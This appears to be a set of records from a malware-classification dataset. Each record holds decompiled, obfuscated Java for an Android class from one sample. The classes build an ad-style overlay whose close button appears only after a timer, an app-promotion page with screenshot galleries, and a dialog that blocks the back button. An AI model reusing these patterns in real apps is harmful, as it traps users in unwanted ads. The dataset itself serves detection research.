"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\a.code","public class a extends RelativeLayout {   private com.baty.dasy.resy.cac.j d;   private FrameLayout e;   private LinearLayout f;   private LinearLayout g;   private ImageView h;   private FrameLayout.LayoutParams i;   private int j;   private Context l;   private t m;   private View.OnClickListener n;   public static a a=null;   public static a b=null;   private static com.baty.dasy.resy.cac.c.a k=null;   public static e f27c=null;   public a(  Context context,  com.baty.dasy.resy.cac.c.a aVar,  int i){     super(context);     this.l=context;     k=aVar;     this.j=i;     this.d=new com.baty.dasy.resy.cac.j(context);     this.e=new FrameLayout(context);     this.f=new LinearLayout(context);     this.g=new LinearLayout(context);     this.g.setOrientation(1);     this.g.setGravity(1);     new LinearLayout.LayoutParams(-2,-2);     this.h=new ImageView(context);     this.i=new FrameLayout.LayoutParams(-2,-2);     this.i.gravity=53;     this.h.setImageDrawable(com.baty.dasy.resy.cac.j.h.a(context,16));     this.m=new t(context,aVar);     if (i == 0) {       setBackgroundColor(-1430471749);       setGravity(17);       this.f.addView(this.m);     }  else {       this.f.addView(this.m,new LinearLayout.LayoutParams(-2,-2));     }     addView(this.e);     this.g.addView(this.f,new LinearLayout.LayoutParams(-2,-2));     this.e.addView(this.g,new LinearLayout.LayoutParams(-2,-2));     this.e.addView(this.h,this.i);     this.h.setOnClickListener(new b(this,context,i));   }   public static a a(  Context context,  com.baty.dasy.resy.cac.c.a aVar,  int i){     k=aVar;     if (i == 0) {       if (a == null) {         a=new a(context,aVar,i);       }       return a;     }     if (b == null) {       b=new a(context,aVar,i);     }     return b;   }   public void a(){     this.h.setVisibility(8);     new c(this,k.q * 1000,1000L).start();   }   public void a(  View.OnClickListener onClickListener){     this.n=onClickListener;   }   public void a(  Animation animation){     if (animation == null || this.m == null) {       return;     }     this.m.startAnimation(animation);   }   public void a(  e eVar){     f27c=eVar;   }   public boolean a(  int i){     this.h.setImageDrawable(com.baty.dasy.resy.cac.j.h.a(this.l,16));     if (this.m != null) {       this.f.removeView(this.m);       this.m=new t(this.l,k);       if (!this.m.a()) {         return false;       }       this.m.invalidate(); switch (i) { case 0:         FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(-2,-2);       layoutParams.rightMargin=com.baty.dasy.resy.cac.j.d.a(this.l,17);     layoutParams.topMargin=com.baty.dasy.resy.cac.j.d.a(this.l,17);   layoutParams.gravity=17; this.f.addView(this.m,layoutParams); break; case 1: FrameLayout.LayoutParams layoutParams2=new FrameLayout.LayoutParams(-2,-2); layoutParams2.rightMargin=com.baty.dasy.resy.cac.j.d.a(this.l,23); layoutParams2.topMargin=com.baty.dasy.resy.cac.j.d.a(this.l,22); this.f.addView(this.m,layoutParams2); break; } this.h.bringToFront(); } if (this.j == 0) { this.m.setOnClickListener(new d(this)); } return true; } @Override public boolean onTouchEvent(MotionEvent motionEvent){ return (f27c == null || this.j == 0) ? super.onTouchEvent(motionEvent) : f27c.a(motionEvent,this.j); } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\b.code","class b implements View.OnClickListener {   final Context a;   final int b;   final a f28c;   public b(  a aVar,  Context context,  int i){     this.f28c=aVar;     this.a=context;     this.b=i;   }   @Override public void onClick(  View view){     com.baty.dasy.resy.cac.j.a(this.a).a(this.b);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\c.code","public class c extends CountDownTimer {   final a a;   public c(  a aVar,  long j,  long j2){     super(j,j2);     this.a=aVar;   }   @Override public void onFinish(){     ImageView imageView;     imageView=this.a.h;     imageView.setVisibility(0);   }   @Override public void onTick(  long j){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\d.code","public class d implements View.OnClickListener {   final a a;   public d(  a aVar){     this.a=aVar;   }   @Override public void onClick(  View view){     View.OnClickListener onClickListener;     View.OnClickListener onClickListener2;     onClickListener=this.a.n;     if (onClickListener != null) {       onClickListener2=this.a.n;       onClickListener2.onClick(view);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\e.code","public interface e {   boolean a(  MotionEvent motionEvent,  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\f.code","public class f extends RelativeLayout implements View.OnClickListener, AdapterView.OnItemClickListener, m {   private LinearLayout a;   private j b;   private n f29c;   private TextView d;   private TextView e;   private TextView f;   private TextView g;   private TextView h;   private ImageView i;   private n j;   private ImageView k;   private View.OnClickListener l;   private s m;   private FrameLayout n;   private TextView o;   private ImageView p;   private ab q;   private Context r;   private boolean s;   private View.OnClickListener t;   private AdapterView.OnItemClickListener u;   public f(  Context context){     super(context);     this.s=true;     this.t=new i(this);     this.u=null;     this.r=context;     this.a=new LinearLayout(context);     this.a.setId(0);     this.a.setOrientation(1);     this.a.setBackgroundColor(-1);     addView(this.a,new RelativeLayout.LayoutParams(-1,-1));     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setGravity(17);     linearLayout.setOrientation(0);     linearLayout.setBackgroundColor(-1776153);     this.a.addView(linearLayout,-1,-2);     LinearLayout linearLayout2=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,1);     layoutParams.gravity=16;     linearLayout2.setBackgroundColor(-4604739);     this.a.addView(linearLayout2,layoutParams);     this.d=new TextView(context);     this.d.setText("""");     this.d.setTextSize(18.0f);     this.d.setTextColor(-12303292);     this.d.setPadding(15,5,5,5);     linearLayout.addView(this.d);     ScrollView scrollView=new ScrollView(context);     this.a.addView(scrollView,new LinearLayout.LayoutParams(-1,-2,1.0f));     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setOrientation(1);     linearLayout3.setPadding(com.baty.dasy.resy.cac.j.d.a(context,8),com.baty.dasy.resy.cac.j.d.a(context,10),com.baty.dasy.resy.cac.j.d.a(context,8),com.baty.dasy.resy.cac.j.d.a(context,6));     scrollView.addView(linearLayout3,new LinearLayout.LayoutParams(-1,-2));     LinearLayout linearLayout4=new LinearLayout(context);     linearLayout3.addView(linearLayout4,new LinearLayout.LayoutParams(-1,-2));     this.i=new ImageView(context);     this.i.setImageResource(R.drawable.sym_def_app_icon);     this.i.setPadding(com.baty.dasy.resy.cac.j.d.a(context,5),com.baty.dasy.resy.cac.j.d.a(context,5),com.baty.dasy.resy.cac.j.d.a(context,5),com.baty.dasy.resy.cac.j.d.a(context,5));     linearLayout4.addView(this.i,-2,-2);     LinearLayout linearLayout5=new LinearLayout(context);     linearLayout5.setOrientation(1);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-1,-2);     layoutParams2.leftMargin=com.baty.dasy.resy.cac.j.d.a(this.r,5);     linearLayout4.addView(linearLayout5,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     layoutParams3.leftMargin=com.baty.dasy.resy.cac.j.d.a(context,5);     TableLayout tableLayout=new TableLayout(context);     TableRow tableRow=new TableRow(context);     TableRow tableRow2=new TableRow(context);     TableRow tableRow3=new TableRow(context);     tableLayout.addView(tableRow);     tableLayout.addView(tableRow2);     tableLayout.addView(tableRow3);     linearLayout5.addView(tableLayout,layoutParams3);     TableRow.LayoutParams layoutParams4=new TableRow.LayoutParams();     layoutParams4.weight=1.0f;     this.e=new TextView(context);     this.e.setText(com.baty.dasy.resy.cac.j.a.a(61));     this.e.setTextSize(15.0f);     this.e.setTextColor(-9144456);     this.e.setSingleLine();     this.e.setEllipsize(TextUtils.TruncateAt.END);     this.e.setMinEms(7);     tableRow.addView(this.e,layoutParams4);     this.f=new TextView(context);     this.f.setTextSize(15.0f);     this.f.setTextColor(-9144456);     this.f.setSingleLine();     this.f.setEllipsize(TextUtils.TruncateAt.END);     tableRow2.addView(this.f,layoutParams4);     this.g=new TextView(context);     this.g.setTextSize(15.0f);     this.g.setTextColor(-9144456);     this.g.setSingleLine();     this.g.setEllipsize(TextUtils.TruncateAt.END);     tableRow3.addView(this.g,layoutParams4);     LinearLayout linearLayout6=new LinearLayout(context);     linearLayout6.setOrientation(1);     linearLayout3.addView(linearLayout6,new LinearLayout.LayoutParams(-1,-2));     LinearLayout linearLayout7=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-1,-2);     int a=com.baty.dasy.resy.cac.j.d.a(context,2);     layoutParams5.bottomMargin=a;     layoutParams5.topMargin=a;     linearLayout6.addView(linearLayout7,layoutParams5);     TextView textView=new TextView(context);     textView.setText(com.baty.dasy.resy.cac.j.a.a(64));     textView.setTextColor(-9144456);     textView.setPadding(com.baty.dasy.resy.cac.j.d.a(context,10),0,0,0);     linearLayout7.addView(textView);     LinearLayout linearLayout8=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-1,1);     layoutParams6.gravity=16;     int a2=com.baty.dasy.resy.cac.j.d.a(context,8);     layoutParams6.rightMargin=a2;     layoutParams6.leftMargin=a2;     linearLayout8.setBackgroundColor(-4604739);     linearLayout7.addView(linearLayout8,layoutParams6);     this.h=new TextView(context);     this.h.setMaxLines(5);     this.h.setText("""");     this.h.setTextSize(16.0f);     this.h.setTextColor(-16777216);     this.h.setPadding(com.baty.dasy.resy.cac.j.d.a(context,10),0,com.baty.dasy.resy.cac.j.d.a(context,5),com.baty.dasy.resy.cac.j.d.a(context,5));     this.h.setLineSpacing(com.baty.dasy.resy.cac.j.d.a(context,5),1.0f);     linearLayout6.addView(this.h);     this.k=new ImageView(context);     this.k.setImageDrawable(com.baty.dasy.resy.cac.j.h.a(context,1));     LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(-2,-2);     layoutParams7.rightMargin=com.baty.dasy.resy.cac.j.d.a(context,10);     layoutParams7.gravity=5;     linearLayout6.addView(this.k,layoutParams7);     this.k.setOnClickListener(this.t);     this.h.setOnClickListener(this.t);     LinearLayout linearLayout9=new LinearLayout(context);     linearLayout3.addView(linearLayout9,new LinearLayout.LayoutParams(-1,-2));     this.f29c=new n(context);     this.f29c.setBackgroundColor(Color.rgb(236,236,236));     this.f29c.setPadding(0,20,0,40);     this.f29c.setSpacing(10);     this.f29c.setUnselectedAlpha(1.1f);     Bitmap b=com.baty.dasy.resy.cac.j.h.b(context,10);     Bitmap b2=com.baty.dasy.resy.cac.j.h.b(context,11);     b.setDensity(240);     b2.setDensity(240);     this.f29c.a(b,b2);     new LinearLayout.LayoutParams(-1,-2).topMargin=com.baty.dasy.resy.cac.j.d.a(context,8);     this.b=new j(this.r);     LinearLayout.LayoutParams layoutParams8=new LinearLayout.LayoutParams(-1,-2);     layoutParams8.topMargin=com.baty.dasy.resy.cac.j.d.a(this.r,4);     linearLayout9.addView(this.b,layoutParams8);     this.b.a(this);     LinearLayout linearLayout10=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams9=new LinearLayout.LayoutParams(-1,1);     layoutParams9.gravity=16;     layoutParams9.topMargin=com.baty.dasy.resy.cac.j.d.a(context,10);     linearLayout10.setBackgroundColor(-4604739);     linearLayout3.addView(linearLayout10,layoutParams9);     LinearLayout linearLayout11=new LinearLayout(context);     linearLayout11.setOrientation(1);     linearLayout3.addView(linearLayout11,new LinearLayout.LayoutParams(-1,-2));     FrameLayout frameLayout=new FrameLayout(context);     LinearLayout.LayoutParams layoutParams10=new LinearLayout.LayoutParams(-1,-2);     int a3=com.baty.dasy.resy.cac.j.d.a(context,2);     layoutParams10.bottomMargin=a3;     layoutParams10.topMargin=a3;     linearLayout11.addView(frameLayout,layoutParams10);     TextView textView2=new TextView(context);     textView2.setText(com.baty.dasy.resy.cac.j.a.a(65));     textView2.setTextColor(-16777216);     textView2.setTextSize(16.0f);     FrameLayout.LayoutParams layoutParams11=new FrameLayout.LayoutParams(-2,-2);     layoutParams11.gravity=19;     frameLayout.addView(textView2,layoutParams11);     ImageView imageView=new ImageView(context);     StateListDrawable stateListDrawable=new StateListDrawable();     stateListDrawable.addState(new int[]{R.attr.state_pressed},com.baty.dasy.resy.cac.j.h.a(context,4));     stateListDrawable.addState(new int[]{R.attr.state_enabled},com.baty.dasy.resy.cac.j.h.a(context,3));     imageView.setBackgroundDrawable(stateListDrawable);     FrameLayout.LayoutParams layoutParams12=new FrameLayout.LayoutParams(-2,-2);     layoutParams12.gravity=21;     layoutParams12.rightMargin=com.baty.dasy.resy.cac.j.d.a(context,8);     imageView.setTag(4);     imageView.setOnClickListener(this);     frameLayout.addView(imageView,layoutParams12);     LinearLayout linearLayout12=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams13=new LinearLayout.LayoutParams(-1,1);     layoutParams13.gravity=16;     linearLayout12.setBackgroundColor(-4604739);     linearLayout11.addView(linearLayout12,layoutParams13);     FrameLayout frameLayout2=new FrameLayout(context);     linearLayout11.addView(frameLayout2,new LinearLayout.LayoutParams(-1,-2));     this.m=new s(context);     FrameLayout.LayoutParams layoutParams14=new FrameLayout.LayoutParams(-1,-1,1);     layoutParams14.gravity=16;     this.m.setNumColumns(2);     this.m.setVerticalSpacing(0);     this.m.setHorizontalSpacing(-1);     this.m.setOnItemClickListener(this);     this.m.setVisibility(8);     this.m.setFocusable(true);     this.m.setFocusableInTouchMode(true);     this.m.setSelector(new ColorDrawable(0));     frameLayout2.addView(this.m,layoutParams14);     this.n=new FrameLayout(context);     frameLayout2.addView(this.n,new LinearLayout.LayoutParams(-1,-1));     LinearLayout linearLayout13=new LinearLayout(context);     linearLayout13.setOrientation(1);     linearLayout13.setGravity(17);     linearLayout13.addView(new ProgressBar(context));     TextView textView3=new TextView(context);     textView3.setText(com.baty.dasy.resy.cac.j.a.a(76));     textView3.setTextColor(-7829368);     textView3.setTextSize(15.0f);     linearLayout13.addView(textView3);     FrameLayout.LayoutParams layoutParams15=new FrameLayout.LayoutParams(-2,-2);     layoutParams15.gravity=17;     this.n.addView(linearLayout13,layoutParams15);     this.n.setVisibility(0);     LinearLayout linearLayout14=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams16=new LinearLayout.LayoutParams(-1,1);     layoutParams16.gravity=16;     linearLayout14.setBackgroundColor(-4604739);     this.a.addView(linearLayout14,layoutParams16);     FrameLayout frameLayout3=new FrameLayout(context);     LinearLayout.LayoutParams layoutParams17=new LinearLayout.LayoutParams(-1,-2);     layoutParams17.gravity=80;     this.a.addView(frameLayout3,layoutParams17);     LinearLayout linearLayout15=new LinearLayout(context);     linearLayout15.setOrientation(1);     LinearLayout linearLayout16=new LinearLayout(context);     linearLayout15.addView(linearLayout16);     FrameLayout.LayoutParams layoutParams18=new FrameLayout.LayoutParams(-1,-2);     layoutParams18.gravity=17;     frameLayout3.addView(linearLayout15,layoutParams18);     LinearLayout.LayoutParams layoutParams19=new LinearLayout.LayoutParams(-2,-2);     layoutParams19.gravity=17;     layoutParams19.setMargins(com.baty.dasy.resy.cac.j.d.a(this.r,5),com.baty.dasy.resy.cac.j.d.a(this.r,5),com.baty.dasy.resy.cac.j.d.a(this.r,0),com.baty.dasy.resy.cac.j.d.a(this.r,5));     Button button=new Button(context);     StateListDrawable stateListDrawable2=new StateListDrawable();     stateListDrawable2.addState(new int[]{R.attr.state_pressed},com.baty.dasy.resy.cac.j.h.a(context,9));     stateListDrawable2.addState(new int[]{R.attr.state_enabled},com.baty.dasy.resy.cac.j.h.a(context,8));     button.setBackgroundDrawable(stateListDrawable2);     linearLayout16.addView(button,layoutParams19);     button.setTag(2);     button.setOnClickListener(this);     LinearLayout linearLayout17=new LinearLayout(context);     linearLayout17.setGravity(17);     StateListDrawable stateListDrawable3=new StateListDrawable();     stateListDrawable3.addState(new int[]{R.attr.state_pressed},com.baty.dasy.resy.cac.j.h.c(context,14));     stateListDrawable3.addState(new int[]{R.attr.state_enabled},com.baty.dasy.resy.cac.j.h.c(context,13));     linearLayout17.setBackgroundDrawable(stateListDrawable3);     linearLayout17.setTag(1);     linearLayout17.setOnClickListener(this);     LinearLayout.LayoutParams layoutParams20=new LinearLayout.LayoutParams(-2,-1);     layoutParams20.setMargins(com.baty.dasy.resy.cac.j.d.a(this.r,5),com.baty.dasy.resy.cac.j.d.a(this.r,5),com.baty.dasy.resy.cac.j.d.a(this.r,0),com.baty.dasy.resy.cac.j.d.a(this.r,5));     layoutParams20.weight=1.0f;     layoutParams20.gravity=17;     linearLayout16.addView(linearLayout17,layoutParams20);     this.p=new ImageView(context);     this.p.setBackgroundDrawable(com.baty.dasy.resy.cac.j.h.a(context,2));     LinearLayout.LayoutParams layoutParams21=new LinearLayout.LayoutParams(-2,-2);     layoutParams21.rightMargin=com.baty.dasy.resy.cac.j.d.a(this.r,5);     linearLayout17.addView(this.p,layoutParams21);     this.o=new TextView(context);     this.o.setText(com.baty.dasy.resy.cac.j.a.a(66));     this.o.setTextColor(-1);     this.o.setTextSize(20.0f);     linearLayout17.addView(this.o,-2,-2);     LinearLayout.LayoutParams layoutParams22=new LinearLayout.LayoutParams(-2,-2);     layoutParams22.setMargins(com.baty.dasy.resy.cac.j.d.a(this.r,5),com.baty.dasy.resy.cac.j.d.a(this.r,5),com.baty.dasy.resy.cac.j.d.a(this.r,5),com.baty.dasy.resy.cac.j.d.a(this.r,5));     layoutParams22.gravity=17;     Button button2=new Button(context);     StateListDrawable stateListDrawable4=new StateListDrawable();     stateListDrawable4.addState(new int[]{R.attr.state_pressed},com.baty.dasy.resy.cac.j.h.a(context,6));     stateListDrawable4.addState(new int[]{R.attr.state_enabled},com.baty.dasy.resy.cac.j.h.a(context,5));     button2.setBackgroundDrawable(stateListDrawable4);     button2.setTag(3);     linearLayout16.addView(button2,layoutParams22);     button2.setOnClickListener(this);     this.j=new n(context,-1);     this.j.setSpacing(10);     this.j.setUnselectedAlpha(1.1f);     this.j.setBackgroundColor(-805306368);     this.j.setPadding(0,10,0,20);     this.j.a(b,b2);     RelativeLayout.LayoutParams layoutParams23=new RelativeLayout.LayoutParams(-1,-1);     layoutParams23.addRule(10,0);     layoutParams23.addRule(12,0);     addView(this.j,layoutParams23);     this.j.setVisibility(8);     this.j.setFadingEdgeLength(0);     this.j.setOnItemClickListener(new g(this));     this.f29c.setOnItemClickListener(new h(this));   }   private String a(  float f){     return f > 1024.0f ? (((int)((f / 1024.0f) * 100.0f)) / 100.0f) + ""M"" : ((int)Math.ceil(f)) + ""K"";   }   public static String d(  String str){     char[] charArray=str.toCharArray();     for (int i=0; i < charArray.length; i++) {       if (charArray[i] == ' ') {         charArray[i]=12288;       }  else       if (charArray[i] == 12288) {       }     }     return new String(charArray);   }   public void a(  int i){     this.g.setText(com.baty.dasy.resy.cac.j.a.a(63) + a(i));   }   public void a(  Bitmap bitmap){     this.i.setImageDrawable(com.baty.dasy.resy.cac.j.h.a(getContext(),bitmap));   }   public void a(  Bitmap bitmap,  int i){     if (bitmap == null) {       return;     }     ((WindowManager)this.r.getSystemService(""window"")).getDefaultDisplay().getMetrics(new DisplayMetrics());     bitmap.setDensity((int)(r1.densityDpi / 0.8f));     this.b.a(bitmap,i);     this.j.a(bitmap,i);   }   public void a(  View.OnClickListener onClickListener){     this.l=onClickListener;   }   public void a(  AdapterView.OnItemClickListener onItemClickListener){     this.u=onItemClickListener;   }   public void a(  String str){     this.e.setText(com.baty.dasy.resy.cac.j.a.a(61) + str);   }   public void a(  List list){     Iterator it=list.iterator();     while (it.hasNext()) {       Bitmap bitmap=(Bitmap)it.next();       ((WindowManager)this.r.getSystemService(""window"")).getDefaultDisplay().getMetrics(new DisplayMetrics());       bitmap.setDensity((int)(r3.densityDpi / 0.8f));     }     this.j.a(list);     this.b.a(list);   }   public boolean a(){     if (this.j.getVisibility() != 0) {       return false;     }     this.j.setVisibility(8);     this.a.setVisibility(0);     return true;   }   public void b(){     this.m.setVisibility(0);     this.n.setVisibility(8);   }   public void b(  int i){     Bitmap b=com.baty.dasy.resy.cac.j.h.b(getContext(),12);     ((WindowManager)this.r.getSystemService(""window"")).getDefaultDisplay().getMetrics(new DisplayMetrics());     b.setDensity((int)(r2.densityDpi / 0.8f));     ArrayList arrayList=new ArrayList(i);     for (int i2=0; i2 < i; i2++) {       arrayList.add(b);     }     a(arrayList);   }   public void b(  String str){     this.d.setText(str);   }   public void b(  List list){     this.q=new ab(this.r,list);     this.m.setAdapter((ListAdapter)this.q);     this.q.notifyDataSetChanged();     this.m.setFocusable(false);     this.m.setVisibility(0);     this.n.setVisibility(8);   }   public void c(){     this.m.setVisibility(4);     this.n.setVisibility(0);   }   @Override public void c(  int i){     this.j.setVisibility(0);     this.j.setSelection(i);   }   public void c(  String str){     this.h.setText(d(str));   }   public void d(){     if (this.q != null) {       this.q.notifyDataSetChanged();     }   }   public void e(  String str){     this.f.setText(com.baty.dasy.resy.cac.j.a.a(62) + str);   }   public void f(  String str){     this.o.setText(str);   }   @Override public void onClick(  View view){     if (this.l != null) {       this.l.onClick(view);     }   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     if (this.u != null) {       this.u.onItemClick(adapterView,view,i,j);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\g.code","public class g implements AdapterView.OnItemClickListener {   final f a;   public g(  f fVar){     this.a=fVar;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     n nVar;     n nVar2;     n nVar3;     nVar=this.a.j;     if (nVar.getVisibility() == 0) {       nVar2=this.a.j;       nVar2.setVisibility(8);       nVar3=this.a.f29c;       nVar3.setSelection(i);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\h.code","public class h implements AdapterView.OnItemClickListener {   final f a;   public h(  f fVar){     this.a=fVar;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     n nVar;     n nVar2;     nVar=this.a.j;     nVar.setVisibility(0);     nVar2=this.a.j;     nVar2.setSelection(i);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\i.code","public class i implements View.OnClickListener {   final f a;   public i(  f fVar){     this.a=fVar;   }   @Override public void onClick(  View view){     boolean z;     TextView textView;     ImageView imageView;     Context context;     TextView textView2;     Context context2;     ImageView imageView2;     Context context3;     z=this.a.s;     if (!z) {       textView=this.a.h;       textView.setMaxLines(5);       imageView=this.a.k;       context=this.a.r;       imageView.setImageDrawable(com.baty.dasy.resy.cac.j.h.a(context,1));       this.a.s=true;       return;     }     textView2=this.a.h;     context2=this.a.r;     textView2.setMaxLines(context2.getWallpaperDesiredMinimumHeight());     imageView2=this.a.k;     context3=this.a.r;     imageView2.setImageDrawable(com.baty.dasy.resy.cac.j.h.a(context3,7));     this.a.s=false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\j.code","public class j extends LinearLayout {   private ImageButton a;   private Context b;   private m f30c;   public j(  Context context){     super(context);     this.f30c=null;     this.b=context;     setBackgroundColor(-1250068);     setLayoutParams(new LinearLayout.LayoutParams(-1,-1));   }   public void a(  Bitmap bitmap,  int i){     ((ImageButton)getChildAt(i)).setBackgroundDrawable(com.baty.dasy.resy.cac.j.h.a(this.b,bitmap));   }   public void a(  m mVar){     this.f30c=mVar;   }   public void a(  List list){     removeAllViews();     int i=0;     while (true) {       int i2=i;       if (i2 >= list.size()) {         return;       }       this.a=new ImageButton(this.b);       this.a.setBackgroundDrawable(com.baty.dasy.resy.cac.j.h.a(this.b,(Bitmap)list.get(i2)));       this.a.setTag(Integer.valueOf(i2));       LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,((Bitmap)list.get(i2)).getHeight());       layoutParams.weight=1.0f;       int a=com.baty.dasy.resy.cac.j.d.a(this.b,3);       layoutParams.bottomMargin=a;       layoutParams.topMargin=a;       layoutParams.leftMargin=a;       layoutParams.rightMargin=a;       addView(this.a,layoutParams);       this.a.setOnClickListener(new k(this));       if (list.size() > 0) {         this.a.post(new l(this,layoutParams,list));       }       i=i2 + 1;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\k.code","public class k implements View.OnClickListener {   final j a;   public k(  j jVar){     this.a=jVar;   }   @Override public void onClick(  View view){     m mVar;     mVar=this.a.f30c;     mVar.c(((Integer)view.getTag()).intValue());   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\l.code","public class l implements Runnable {   final LinearLayout.LayoutParams a;   final List b;   final j f31c;   public l(  j jVar,  LinearLayout.LayoutParams layoutParams,  List list){     this.f31c=jVar;     this.a=layoutParams;     this.b=list;   }   @Override public void run(){     Context context;     ImageButton imageButton;     context=this.f31c.b;     int m=(com.baty.dasy.resy.cac.j.d.m(context) - ((this.a.leftMargin + this.a.rightMargin) * this.b.size())) / this.b.size();     this.a.height=(((Bitmap)this.b.get(0)).getHeight() * m) / ((Bitmap)this.b.get(0)).getWidth();     imageButton=this.f31c.a;     imageButton.setLayoutParams(this.a);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\m.code","public interface m {   void c(  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\n.code","public class n extends Gallery {   private Bitmap a;   private Bitmap b;   private int f32c;   public n(  Context context){     this(context,(AttributeSet)null);   }   public n(  Context context,  int i){     this(context,(AttributeSet)null);     this.f32c=i;   }   public n(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.f32c=-2;     setAdapter((SpinnerAdapter)new o(this));   }   private void a(  Canvas canvas){     int count=getAdapter().getCount();     if (count <= 0 || this.a == null || this.b == null) {       return;     }     int width=this.a.getWidth();     int height=this.a.getHeight();     int selectedItemPosition=getSelectedItemPosition();     int width2=((getWidth() - (width * count)) - ((count - 1) * 10)) / 2;     int height2=(getHeight() - height) - 10;     for (int i=0; i < count; i++) {       if (i != selectedItemPosition) {         canvas.drawBitmap(this.a,width2,height2,(Paint)null);       }  else {         canvas.drawBitmap(this.b,width2,height2,(Paint)null);       }       width2+=width + 10;     }   }   private boolean a(  MotionEvent motionEvent,  MotionEvent motionEvent2){     return motionEvent2.getX() > motionEvent.getX();   }   public void a(  Bitmap bitmap,  int i){     o oVar=(o)getAdapter();     oVar.a().set(i,bitmap);     oVar.notifyDataSetChanged();   }   public void a(  Bitmap bitmap,  Bitmap bitmap2){     this.a=bitmap;     this.b=bitmap2;     this.a.setDensity(240);     this.b.setDensity(240);   }   public void a(  List list){     ((o)getAdapter()).a(list);   }   @Override public void draw(  Canvas canvas){     super.draw(canvas);     a(canvas);   }   @Override public boolean onFling(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     onKeyDown(a(motionEvent,motionEvent2) ? 21 : 22,null);     return true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\o.code","public class o extends BaseAdapter {   List a=new ArrayList();   final n b;   public o(  n nVar){     this.b=nVar;   }   public List a(){     return this.a;   }   public void a(  List list){     this.a=list;     notifyDataSetChanged();   }   @Override public int getCount(){     return this.a.size();   }   @Override public Object getItem(  int i){     return this.a.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     View view2;     int i2;     int i3;     if (view == null) {       ImageView imageView=new ImageView(this.b.getContext());       imageView.setAdjustViewBounds(true);       imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);       i2=this.b.f32c;       i3=this.b.f32c;       imageView.setLayoutParams(new Gallery.LayoutParams(i2,i3));       view2=imageView;     }  else {       view2=view;     }     ((ImageView)view2).setImageDrawable(com.baty.dasy.resy.cac.j.h.a(this.b.getContext(),(Bitmap)this.a.get(i)));     return view2;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\p.code","public class p extends Dialog {   private boolean a;   private com.baty.dasy.resy.cac.c.a b;   private r f33c;   public p(  Context context,  boolean z,  DialogInterface.OnCancelListener onCancelListener,  com.baty.dasy.resy.cac.c.a aVar){     super(context,z,onCancelListener);     this.a=false;     this.b=aVar;     new q(this,this.b.q * 1000,1000L).start();   }   public void a(  r rVar){     this.f33c=rVar;   }   @Override public void onBackPressed(){     if (this.a) {       super.onBackPressed();       this.f33c.a();     }   }   @Override public void onWindowFocusChanged(  boolean z){     super.onWindowFocusChanged(z);   } } "
